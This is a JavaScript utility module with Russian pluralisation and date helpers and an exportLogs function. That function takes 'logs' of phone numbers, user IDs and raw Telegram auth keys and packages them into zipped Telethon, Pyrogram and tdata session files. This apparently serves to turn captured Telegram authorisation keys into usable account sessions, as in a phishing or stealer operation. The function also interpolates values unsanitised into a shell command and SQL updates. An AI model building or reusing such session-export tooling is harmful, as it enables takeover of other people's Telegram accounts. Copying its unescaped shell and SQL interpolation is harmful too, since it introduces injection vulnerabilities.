import archiver from "archiver";
import fs from 'fs';
import sqlite3 from 'sqlite3';
import { open } from 'sqlite';
import { exec } from "child_process";

export function declineDays(days) {
    const lastDigit = days % 10;
    const lastTwoDigits = days % 100;

    if (lastTwoDigits >= 11 && lastTwoDigits <= 19) {
        return `${days} дней`;
    }

    if (lastDigit === 1) {
        return `${days} день`;
    }

    if (lastDigit >= 2 && lastDigit <= 4) {
        return `${days} дня`;
    }

    return `${days} дней`;
}

export function decline(number, titles) {
    const cases = [2, 0, 1, 1, 1, 2];
    return number + ' ' + titles[(number % 100 > 4 && number % 100 < 20) ? 2 : cases[(number % 10 < 5) ? number % 10 : 5]];
}
export function formatDate(date) {
    return date.toLocaleDateString('ru-RU', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric'
    });
}
export function validateLink(link){
    return link.match(/(https?:\/\/[^\s]+)/g);
}

export function getServerById(dcId) {
    return [
        "149.154.175.55", '149.154.167.50', '149.154.175.100',
        "149.154.167.91", '91.108.56.170'
    ][dcId - 1];
}

export function execAsync(command) {
    return new Promise(resolve => {
        exec(command, resolve);
    });
}

export async function exportLogs(logs, type) {
    const dir = `src/temp/${Date.now()}`;
    let template = 'telethon';

    fs.mkdirSync(dir);
    fs.mkdirSync(`${dir}/data`);

    return new Promise(async resolve => {
        switch(type) {
            case 'session + json':
                const templateJson = JSON.parse(fs.readFileSync(`sessions/session.json`, 'utf-8'));

                for(let log of logs) {
                    let json = templateJson;

                    json.session_file = log.id.toString();
                    json.phone = log.phone.toString();
                    json.user_id = log.uid.toString();

                    fs.writeFileSync(`${dir}/data/${log.id}.json`, JSON.stringify(json), 'utf-8');
                }
            case 'pyrogram':
                if(!type.includes('json')) template = 'pyrogram';
            case 'telethon':
                await Promise.all(
                    logs.map(async log => {
                        const file = `${dir}/data/${log.id}.session`;
                        fs.copyFileSync(`sessions/${template}.session`, file);

                        const connection = await open({
                            filename: `${file}`,
                            driver: sqlite3.Database
                        });
                        
                        if(type !== 'pyrogram') {
                            await connection.run(`update sessions set dc_id = ${log.dcId}, server_address = '${getServerById(log.dcId)}', auth_key = $key`, {
                                '$key': Buffer.from(log.authKey, 'hex')
                            });
                        } else {
                            await connection.run(`update sessions set dc_id = ${log.dcId}, user_id=${log.uid}, date=${Math.floor(Date.now() / 1000)}, auth_key = $key`, {
                                '$key': Buffer.from(log.authKey, 'hex')
                            });
                        }
                        
                        await connection.close();
                    })
                );
                break;
            case 'tdata':
                for(let log of logs) {
                    const path = `${dir}/data/${log.id}`;
                    fs.mkdirSync(path);
                    console.log(await execAsync(
                        `python3 tdata.py ${log.dcId} ${log.uid} ${log.authKey} ${path}`
                    ));
                }
                break;
        }

        const archive = archiver('zip');
        const name = `${dir}/sessions_${type}.zip`;
        const output = fs.createWriteStream(name);

        output.on('close', () => {
            resolve(name);
        });

        archive.on('error', console.log);

        archive.pipe(output);

        archive.directory(dir + '/data', false);

        archive.finalize();
    });
}

export default {
    declineDays,
    formatDate,
    decline,
    validateLink
}